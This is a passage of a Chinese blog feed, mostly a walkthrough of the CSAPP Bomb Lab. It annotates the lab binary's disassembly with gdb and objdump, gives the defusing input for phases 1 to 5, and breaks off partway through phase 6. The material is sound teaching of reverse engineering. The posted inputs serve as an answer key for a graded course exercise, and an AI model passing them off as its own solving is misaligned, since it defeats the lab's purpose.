class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>基础算法</category>
      </categories>
      <tags>
        <tag>二叉树</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-3-bomblab</title>
    <url>/2023/10/25/CSAPP-3-bomblab/</url>
    <content><![CDATA[<h1 id="3-bomb-lab"><a href="#3-bomb-lab" class="headerlink" title="3.bomb lab"></a>3.bomb lab</h1><p><strong>参考：</strong></p>
<ol>
<li><a href="https://blog.csdn.net/aufefgavo/article/details/119697258">深入理解计算机系统-bomblab详解_独小雪的博客-CSDN博客</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/449879729">Lab2 CSAPP: BombLab环境+思路+全注释 - 知乎 (zhihu.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/451623574">手把手教你拆解 CSAPP 的 炸弹实验室 BombLab - 知乎 (zhihu.com)</a></li>
</ol>
<h2 id="3-1基本指令"><a href="#3-1基本指令" class="headerlink" title="3.1基本指令"></a>3.1基本指令</h2><ul>
<li>必须反汇编对炸弹进行拆除</li>
<li><code>objdump -d bomb &gt; bomb.s</code>生成bomb的汇编文件</li>
<li><code>objdump -d bomb &gt; bomb.t</code>生成bomb的符号表</li>
<li><code>gdb bomb</code>gdb调试bomb程序</li>
<li><code>(gdb) b 0x0000</code>设置断点</li>
<li><code>(gdb) x/wx 0x0000 </code>指令x：查看内存指令、w：四字节  x：16进制显示</li>
<li><strong>所有的字符串都是通过%rdi寄存器传入的</strong>，在 bomb.s中搜索 phase_1，可以得到如下的代码：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">400e32:	e8 67 06 00 00       	callq  40149e &lt;read_line&gt; # 读取命令行的字符串，%rax是 readline 的返回值也就是输入的string</span><br><span class="line">400e37:	48 89 c7             	mov    %rax,%rdi #将输入的string存入 %rdi 寄存器，传入phase函数</span><br><span class="line">400e3a:	e8 a1 00 00 00       	callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">400e3f:	e8 80 07 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">400e44:	bf a8 23 40 00       	mov    $0x4023a8,%edi</span><br></pre></td></tr></table></figure>









<h2 id="3-2-phase1"><a href="#3-2-phase1" class="headerlink" title="3.2 phase1"></a>3.2 phase1</h2><p>在<strong>bomb.s</strong>搜素 phase_1 ，可以得到如下的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp </span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p><strong>题目分析：</strong></p>
<ul>
<li>函数调用了<code>strings_not_equal</code>这个函数，主要是判断输入的字符串与对比的字符串是否不相等：相等返回0，不相等则会返回非0。<strong>即 如果%rdi 与 地址（0x402400）存的字符串相等就不会bomb</strong></li>
</ul>
<p><strong>汇编代码分析：</strong></p>
<ul>
<li><code>sub    $0x8,%rsp </code>  %rsp是栈指针寄存器，存储栈的顶部位置， 这一行将栈顶减去8位，为函数的局部变量分配空间。</li>
<li><code>mov    $0x402400,%esi</code>将 地址（0x402400）的字符串，放入到 %esi 中。</li>
<li><code>callq  401338 &lt;strings_not_equal&gt;</code>  调用地址（401338）的函数 用于判断两个字符串是否不相等</li>
<li><code>test   %eax,%eax</code>  对%eax寄存器中的内容 进行与运算。<strong>test</strong>指令执行按位与的操作，类似于<strong>and</strong>指令，但是<strong>test 不会保存结果，只会更新标志寄存器的值</strong>。<ul>
<li>因此test指令通常用作检查某个寄存器或者内存位置的位模式，而不需要保存结果。</li>
<li>test操作，如果结果为0，则将零标志位（ZF），设置为1 通常与（je、jne、j1、jg）配合使用</li>
</ul>
</li>
<li><code>je     400ef7 &lt;phase_1+0x17&gt;</code> 与运算设置了0 标志位 ，那么就跳转400ef7 <code>add    $0x8,%rsp</code> 释放之前的空间。<ul>
<li>je指令 对应于标志寄存器中的零标志（ZF），如果上一条指令产生了零标志，那么程序会跳转到指定地址。</li>
</ul>
</li>
<li><code>callq  40143a &lt;explode_bomb&gt;</code> 否则执行地址（40143a）的函数 爆炸</li>
</ul>
<p><strong>题解：</strong></p>
<ul>
<li><code>gdb bomb</code></li>
<li><code>x/s 0x402400</code><ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231025214536447.png" alt="image-20231025214536447"></li>
</ul>
</li>
<li>在中断中输入：Border relations with Canada have never been better.<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231025214702401.png" alt="image-20231025214702401"></li>
</ul>
</li>
</ul>
<h2 id="3-2-phase-2"><a href="#3-2-phase-2" class="headerlink" title="3.2 phase_2"></a>3.2 phase_2</h2><p><strong>phase_2汇编代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400efc &lt;phase_2&gt;:</span><br><span class="line">  400efc:	55                   	push   %rbp</span><br><span class="line">  400efd:	53                   	push   %rbx</span><br><span class="line">  400efe:	48 83 ec 28          	sub    $0x28,%rsp #开了10个4字节的空间，多开了4个？？？</span><br><span class="line">  400f02:	48 89 e6             	mov    %rsp,%rsi#将开辟的地址传入%rsp存放的就是数组第一个元素</span><br><span class="line">  400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt; #读取六个数字</span><br><span class="line">  400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp) #第一个参数是否是1</span><br><span class="line">  400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt; #是1则跳转0x400f30</span><br><span class="line">  400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt; #否则就bomb</span><br><span class="line">  400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">  400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax #取得上一个输入的数，放入%eax</span><br><span class="line">  400f1a:	01 c0                	add    %eax,%eax #%加倍</span><br><span class="line">  400f1c:	39 03                	cmp    %eax,(%rbx) #与当前的数比较</span><br><span class="line">  400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt; #相等则跳过下一行到0x400f25</span><br><span class="line">  400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400f25:	48 83 c3 04          	add    $0x4,%rbx #指向下一个参数的位置 %rbx加上立即数</span><br><span class="line">  400f29:	48 39 eb             	cmp    %rbp,%rbx #判断是否是第六个参数 0x18 == 24 == 4*6</span><br><span class="line">  400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt; #不是则继续进行循环</span><br><span class="line">  400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt; # 是则跳转0x400f3c</span><br><span class="line">  400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx #第二个数</span><br><span class="line">  400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">  400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;#跳转0x400f17继续循环</span><br><span class="line">  400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  400f40:	5b                   	pop    %rbx</span><br><span class="line">  400f41:	5d                   	pop    %rbp</span><br><span class="line">  400f42:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p><strong>read_six_numbers汇编代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000000000040145c &lt;read_six_numbers&gt;:#从我们输入的字符串中读取6个数字   第一个参数是%rdi</span><br><span class="line">  40145c:	48 83 ec 18          	sub    $0x18,%rsp #0x18 = 4 * 6 6个4字节的地址</span><br><span class="line">  401460:	48 89 f2             	mov    %rsi,%rdx #%rdx第三个参数寄存器</span><br><span class="line">  401463:	48 8d 4e 04          	lea    0x4(%rsi),%rcx #%rcx第四个</span><br><span class="line">  401467:	48 8d 46 14          	lea    0x14(%rsi),%rax </span><br><span class="line">  40146b:	48 89 44 24 08       	mov    %rax,0x8(%rsp) #第八个</span><br><span class="line">  401470:	48 8d 46 10          	lea    0x10(%rsi),%rax</span><br><span class="line">  401474:	48 89 04 24          	mov    %rax,(%rsp)</span><br><span class="line">  401478:	4c 8d 4e 0c          	lea    0xc(%rsi),%r9# 第六个</span><br><span class="line">  40147c:	4c 8d 46 08          	lea    0x8(%rsi),%r8 #第五个</span><br><span class="line">  401480:	be c3 25 40 00       	mov    $0x4025c3,%esi</span><br><span class="line">  401485:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40148a:	e8 61 f7 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt; #sscanf</span><br><span class="line">  40148f:	83 f8 05             	cmp    $0x5,%eax</span><br><span class="line">  401492:	7f 05                	jg     401499 &lt;read_six_numbers+0x3d&gt;</span><br><span class="line">  401494:	e8 a1 ff ff ff       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401499:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  40149d:	c3                   	retq</span><br></pre></td></tr></table></figure>

<p><strong>思路：</strong></p>
<ul>
<li><code>callq  40145c &lt;read_six_numbers&gt;</code>调用函数“先读入六个数”，同 phase1一样，%rdi原封不动的传入了这个函数，那么%rsi存入的是什么呢？</li>
<li><code>sub    $0x28,%rsp</code>和<code>mov    %rsp,%rsi</code> 这两行代码可以看出，先将%rsp中的栈指针栈顶 减去 0x28，然后存入%rsi中，<strong>所以%rsi中存入的是地址</strong>。结合函数<read_six_numbers> 可以得%rsi 在源码是一个指针，指向一个数组的开头</read_six_numbers></li>
<li>在read six numbers中 0x4（%rsi） 。。有几个地址还因为寄存器放不下 放入到了栈中，sscanf的第一个参数是read six numbers的第一个参数，输入的字符串 第二个参数是存储在0x4025c3中的字符串格式<ul>
<li><code>x/s 0x4025c3</code>查看 字符串存储的格式</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026153037844.png" alt="image-20231026153037844"></li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026151232389.png" alt="image-20231026151232389"></li>
</ul>
</li>
<li>回到phase_2函数<ul>
<li>判断第一个元素是否是1，是则跳转0x400f30</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026151727168.png" alt="image-20231026151727168"></li>
<li>0x400f30 是%rsp增加四字节（数组的第二个元素），放入%rbx中，然后把最后一个数字的下一个字节放入到%rbp——–0x18 &#x3D; 24 &#x3D; 4 * 6  用于判断循环终止，然后回到0x400f17</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026151852711.png" alt="image-20231026151852711"></li>
<li>0x400f17  <code>mov    -0x4(%rbx),%eax</code> <strong>取得%rbx上一个数 放入%eax ，然后相加使其翻倍</strong>，最后将翻倍的数与当前的数进行比较 ，循环比较剩下五个数。</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026152238146.png" alt="image-20231026152238146"></li>
<li>其实是以1为首项，2为公比的等比数列。</li>
</ul>
</li>
<li>所以答案输入1 2 4 8 16 32就好</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026153417850.png" alt="phrase_2"></li>
</ul>
<h2 id="3-3-phase-3"><a href="#3-3-phase-3" class="headerlink" title="3.3 phase_3"></a>3.3 phase_3</h2><p><strong>phase_3 coding</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi #“%d %d”</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax #和1比较</span><br><span class="line">  400f63:	7f 05                	jg     400f6a &lt;phase_3+0x27&gt; #greater大于则跳转 0x400f6a</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt; #否则bomb</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp) #比较第一个数是否小于7 </span><br><span class="line">  400f6f:	77 3c                	ja     400fad &lt;phase_3+0x6a&gt; #above无符号大于则跳转 bomb不满足 case</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax </span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8) #无条件跳转 0x400f7c case0</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax #case 0  0xcf = 207</span><br><span class="line">  400f81:	eb 3b                	jmp    400fbe &lt;phase_3+0x7b&gt; </span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax #case 1 0x2c3 = 707</span><br><span class="line">  400f88:	eb 34                	jmp    400fbe &lt;phase_3+0x7b&gt; </span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax #case 2 0x100 = 256</span><br><span class="line">  400f8f:	eb 2d                	jmp    400fbe &lt;phase_3+0x7b&gt; </span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax #case 3 0x185 = 389</span><br><span class="line">  400f96:	eb 26                	jmp    400fbe &lt;phase_3+0x7b&gt; </span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax #case 4 0xce = 206</span><br><span class="line">  400f9d:	eb 1f                	jmp    400fbe &lt;phase_3+0x7b&gt; </span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax #case 5 0x2aa = 682</span><br><span class="line">  400fa4:	eb 18                	jmp    400fbe &lt;phase_3+0x7b&gt; </span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax #case 6 0x147 = 327</span><br><span class="line">  400fab:	eb 11                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax #else case</span><br><span class="line">  400fb7:	eb 05                	jmp    400fbe &lt;phase_3+0x7b&gt;</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax #处理第二个数 与case中存放的数进行比较</span><br><span class="line">  400fc2:	74 05                	je     400fc9 &lt;phase_3+0x86&gt; #equal相等则跳转</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  400fcd:	c3                   	retq   </span><br></pre></td></tr></table></figure>



<p><strong>思路：</strong></p>
<ul>
<li>考察的是switch语句的汇编表示，也调用了sscanf<ul>
<li><code>x/s 0x4025cf</code>结果是两个数，第一个放在0xc（%rsp）存入rcx 和 第二个数放在0x8（rsp）存入 rdx</li>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026161957698.png" alt="0x4025cf"></li>
</ul>
</li>
<li>对于0x8（rsp）只在下面出现过<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026162400954.png" alt="image-20231026162400954"></li>
<li>*解引用 也就是0x402470这个地址在存储的 值与8乘rax的值加在一起组成的地址 rax既是前一个输入的参数 </li>
<li><code>x/wx 0x402470</code>得到  指令x：查看内存指令、w：四字节 x：16进制显示，<strong>跳转到0x400f7c，也就是下一行，对应switch的第一个case</strong><ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026162723425.png" alt="image-20231026162723425"></li>
</ul>
</li>
</ul>
</li>
<li>对于0xc：<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026163415020.png" alt="image-20231026163415020"></li>
</ul>
</li>
<li>这七个case 处理不同的逻辑，即我们传入两个数，第一个数用来判断要去哪个case， 第二个数用来和这个case存放的书进行比较，如果相等则通过，不相等则bomb </li>
<li>答案不唯一 对应的case 输入对应的值就好 0 207<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026164924005.png" alt="phase_3"></li>
</ul>
</li>
</ul>
<h2 id="3-4-phase-4"><a href="#3-4-phase-4" class="headerlink" title="3.4 phase_4"></a>3.4 phase_4</h2><p><strong>phase_4 coding</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401010:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx #第二个数</span><br><span class="line">  401015:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx #第一个数</span><br><span class="line">  40101a:	be cf 25 40 00       	mov    $0x4025cf,%esi # %d %d </span><br><span class="line">  40101f:	b8 00 00 00 00       	mov    $0x0,%eax #eax存入0</span><br><span class="line">  401024:	e8 c7 fb ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt; #sscanf</span><br><span class="line">  401029:	83 f8 02             	cmp    $0x2,%eax #</span><br><span class="line">  40102c:	75 07                	jne    401035 &lt;phase_4+0x29&gt;  #jump not equal 不相等则跳转 bomb</span><br><span class="line">  40102e:	83 7c 24 08 0e       	cmpl   $0xe,0x8(%rsp) #32位比较0xe = 14</span><br><span class="line">  401033:	76 05                	jbe    40103a &lt;phase_4+0x2e&gt; #jbe小于等于则跳转 0x40103a </span><br><span class="line">  401035:	e8 00 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:	ba 0e 00 00 00       	mov    $0xe,%edx # 14</span><br><span class="line">  40103f:	be 00 00 00 00       	mov    $0x0,%esi # 0 传入func函数</span><br><span class="line">  401044:	8b 7c 24 08          	mov    0x8(%rsp),%edi #第一个参数传入 edi</span><br><span class="line">  401048:	e8 81 ff ff ff       	callq  400fce &lt;func4&gt; # func 调用</span><br><span class="line">  40104d:	85 c0                	test   %eax,%eax #test 与运算</span><br><span class="line">  40104f:	75 07                	jne    401058 &lt;phase_4+0x4c&gt; #不相等 不等于0则bomb</span><br><span class="line">  401051:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%rsp) #0 比较 </span><br><span class="line">  401056:	74 05                	je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:	e8 dd 03 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  401061:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p><strong>func4 coding</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400fd2:	89 d0                	mov    %edx,%eax #edx = 14  eax = 0xe</span><br><span class="line">  400fd4:	29 f0                	sub    %esi,%eax #esi = 0   eax = 0xe - 0x0</span><br><span class="line">  400fd6:	89 c1                	mov    %eax,%ecx # ecx = 0xe</span><br><span class="line">  400fd8:	c1 e9 1f             	shr    $0x1f,%ecx #逻辑右移 0x1f = 31位 ecx = 0</span><br><span class="line">  400fdb:	01 c8                	add    %ecx,%eax # eax = 0xe</span><br><span class="line">  400fdd:	d1 f8                	sar    %eax  #算数右移1位 符号位不变 1110(14)  -&gt;0111(7)</span><br><span class="line">  400fdf:	8d 0c 30             	lea    (%rax,%rsi,1),%ecx #rsi(0) + rax(7) = 0x7 </span><br><span class="line">  400fe2:	39 f9                	cmp    %edi,%ecx #与传入的参数比较</span><br><span class="line">  400fe4:	7e 0c                	jle    400ff2 &lt;func4+0x24&gt; #小于或等于跳0x400ff2 </span><br><span class="line">  400fe6:	8d 51 ff             	lea    -0x1(%rcx),%edx #大于的情况 则减一</span><br><span class="line">  400fe9:	e8 e0 ff ff ff       	callq  400fce &lt;func4&gt;</span><br><span class="line">  400fee:	01 c0                	add    %eax,%eax</span><br><span class="line">  400ff0:	eb 15                	jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:	b8 00 00 00 00       	mov    $0x0,%eax #eax = 0</span><br><span class="line">  400ff7:	39 f9                	cmp    %edi,%ecx # 比较ecx = 7 edi 传入的参数</span><br><span class="line">  400ff9:	7d 0c                	jge    401007 &lt;func4+0x39&gt; #&gt;= 跳401007</span><br><span class="line">  400ffb:	8d 71 01             	lea    0x1(%rcx),%esi #否则（小于的情况） esi + 1</span><br><span class="line">  400ffe:	e8 cb ff ff ff       	callq  400fce &lt;func4&gt; #递归</span><br><span class="line">  401003:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401007:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  40100b:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p><strong>思路</strong></p>
<ul>
<li>同上sscanf 输入标准化是“<code>%d %d</code>” 第一个数放在0x8(%rsp)，第二个数放在0xc(%rsp)</li>
<li>要求第一个数不大于14<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026194939554.png" alt="image-20231026194939554"></li>
</ul>
</li>
<li>要求第二个数等于0<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026195056021.png" alt="image-20231026195056021"></li>
</ul>
</li>
<li>使用 0x8，调用了func4 函数,func函数的第一个参数是我们输入的第一个数 0x8(%rsp)，第二个 第三个参数是常数，然后判断func的返回值 是否等于0，不能等0则bomb<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026171015752.png" alt="image-20231026171015752"></li>
</ul>
</li>
<li>然后就分析 func函数传入0和 14实现了什么 那么 ecx &#x3D; 7 只需要让rdi也等于7 即第一参数等于7即可<ul>
<li><code>sar    %eax</code> 等价于<code>SAR EAX 1</code></li>
</ul>
</li>
<li>输入 7 0<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026202629160.png" alt="phase_4"></li>
</ul>
</li>
</ul>
<h2 id="3-5-phase-5"><a href="#3-5-phase-5" class="headerlink" title="3.5 phase_5"></a>3.5 phase_5</h2><p><strong>phase_5 coding</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:	53                   	push   %rbx</span><br><span class="line">  401063:	48 83 ec 20          	sub    $0x20,%rsp #开辟空间 32字节</span><br><span class="line">  401067:	48 89 fb             	mov    %rdi,%rbx #rdi = rbx</span><br><span class="line">  40106a:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax #fs偏移0x28(40)存入%rax中 保护堆栈</span><br><span class="line">  401071:	00 00 </span><br><span class="line">  401073:	48 89 44 24 18       	mov    %rax,0x18(%rsp)</span><br><span class="line">  401078:	31 c0                	xor    %eax,%eax #异或</span><br><span class="line">  40107a:	e8 9c 02 00 00       	callq  40131b &lt;string_length&gt; #调用函数</span><br><span class="line">  40107f:	83 f8 06             	cmp    $0x6,%eax #6 和eax比较 传入6个字符</span><br><span class="line">  401082:	74 4e                	je     4010d2 &lt;phase_5+0x70&gt; #相等则跳转4010d2</span><br><span class="line">  401084:	e8 b1 03 00 00       	callq  40143a &lt;explode_bomb&gt; #否则bomb</span><br><span class="line">  401089:	eb 47                	jmp    4010d2 &lt;phase_5+0x70&gt; </span><br><span class="line">  40108b:	0f b6 0c 03          	movzbl (%rbx,%rax,1),%ecx # 0扩展 ecx = *rax + *rbx = *rdi + *rax 第rax个字符</span><br><span class="line">  40108f:	88 0c 24             	mov    %cl,(%rsp) #栈顶rsp = cl（rax的低4位） </span><br><span class="line">  401092:	48 8b 14 24          	mov    (%rsp),%rdx  #rdx = rsp = cl （rax的低4位）</span><br><span class="line">  401096:	83 e2 0f             	and    $0xf,%edx #edx与运算 1111 即取cl的低四位 存入edx</span><br><span class="line">  401099:	0f b6 92 b0 24 40 00 	movzbl 0x4024b0(%rdx),%edx #第一条字符串 0x4024b0[rdx]处的字符加载到edx上</span><br><span class="line">  4010a0:	88 54 04 10          	mov    %dl,0x10(%rsp,%rax,1) #dl-&gt;rax + rsp + 0x10处</span><br><span class="line">  4010a4:	48 83 c0 01          	add    $0x1,%rax #rax++</span><br><span class="line">  4010a8:	48 83 f8 06          	cmp    $0x6,%rax #循环6次</span><br><span class="line">  4010ac:	75 dd                	jne    40108b &lt;phase_5+0x29&gt; #不相等最跳转0x40108b循环</span><br><span class="line">  4010ae:	c6 44 24 16 00       	movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:	be 5e 24 40 00       	mov    $0x40245e,%esi #第二条字符串 “flyers”</span><br><span class="line">  4010b8:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi #0x10~0x15（rsp） 和flyers是否相等</span><br><span class="line">  4010bd:	e8 76 02 00 00       	callq  401338 &lt;strings_not_equal&gt; #看字符串是否不相等 不相等则爆炸</span><br><span class="line">  4010c2:	85 c0                	test   %eax,%eax #与运算</span><br><span class="line">  4010c4:	74 13                	je     4010d9 &lt;phase_5+0x77&gt; #相等跳d9</span><br><span class="line">  4010c6:	e8 6f 03 00 00       	callq  40143a &lt;explode_bomb&gt; #否则报错</span><br><span class="line">  4010cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:	eb 07                	jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:	b8 00 00 00 00       	mov    $0x0,%eax # 最初 eax = 0</span><br><span class="line">  4010d7:	eb b2                	jmp    40108b &lt;phase_5+0x29&gt; #跳转40108b</span><br><span class="line">  4010d9:	48 8b 44 24 18       	mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:	00 00 </span><br><span class="line">  4010e7:	74 05                	je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:	e8 42 fa ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:	48 83 c4 20          	add    $0x20,%rsp</span><br><span class="line">  4010f2:	5b                   	pop    %rbx</span><br><span class="line">  4010f3:	c3                   	retq   </span><br></pre></td></tr></table></figure>



<p><strong>思路：</strong></p>
<ul>
<li><code>gdb x/s 0x4024b0</code>得到如下字符串<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026204707552.png" alt="image-20231026204707552"></li>
</ul>
</li>
<li><code>gdb x/s 0x40245e</code> 得到如下字符串：<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026205058798.png" alt="image-20231026205058798"></li>
</ul>
</li>
<li><code>cmp    $0x6,%eax</code> 和 <code>je     4010d2 &lt;phase_5+0x70&gt;</code> 规定了要传入6个字符 否则会爆炸</li>
<li>即我们<strong>输入的6个字符 低四位rdx 在0x4024b0[rdx]</strong> 得到一个字符串<strong>要与 flyers相等</strong>就行</li>
<li>所以在字符串1中找出rdx即可 分别是9（1001）、15（1111）、14（1110）、5（0101）、6（0110）、7（0111）</li>
<li>查找ascii码数的低四位即可是上述即可 9?NUVW<ul>
<li><img src="/2023/10/25/CSAPP-3-bomblab/image-20231026214015659.png" alt="image-20231026214015659"></li>
</ul>
</li>
</ul>
<h2 id="3-6-phase-6"><a href="#3-6-phase-6" class="headerlink" title="3.6 phase_6"></a>3.6 phase_6</h2><p><strong>phase_6 coding</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:	41 56                	push   %r14</span><br><span class="line">  4010f6:	41 55                	push   %r13</span><br><span class="line">  4010f8:	41 54                	push   %r12</span><br><span class="line">  4010fa:	55                   	push   %rbp</span><br><span class="line">  4010fb:	53                   	push   %rbx</span><br><span class="line">  4010fc:	48 83 ec 50          	sub    $0x50,%rsp #开辟0x50 空间</span><br><span class="line">  401100:	49 89 e5             	mov    %rsp,%r13 # r13 = rsp </span><br><span class="line">  401103:	48 89 e6             	mov    %rsp,%rsi #rsi = rsp  </span><br><span class="line">  401106:	e8 51 03 00 00       	callq  40145c &lt;read_six_numbers&gt; #调用函数</span><br><span class="line">  40110b:	49 89 e6             	mov    %rsp,%r14 #r14 = rsp</span><br><span class="line">  40110e:	41 bc 00 00 00 00    	mov    $0x0,%r12d #r12d = 0x0</span><br><span class="line">  --------------------------------------------------------------------#大循环1 r12d是下标</span><br><span class="line">  401114:	4c 89 ed             	mov    %r13,%rbp #rbp = r13 =rsp</span><br><span class="line">  401117:	41 8b 45 00          	mov    0x0(%r13),%eax #</span><br><span class="line">  40111b:	83 e8 01             	sub    $0x1,%eax #eax--</span><br><span class="line">  40111e:	83 f8 05             	cmp    $0x5,%eax </span><br><span class="line">  401121:	76 05                	jbe    401128 &lt;phase_6+0x34&gt; #&lt;=5 则跳401128说明输入在[1,6]之间 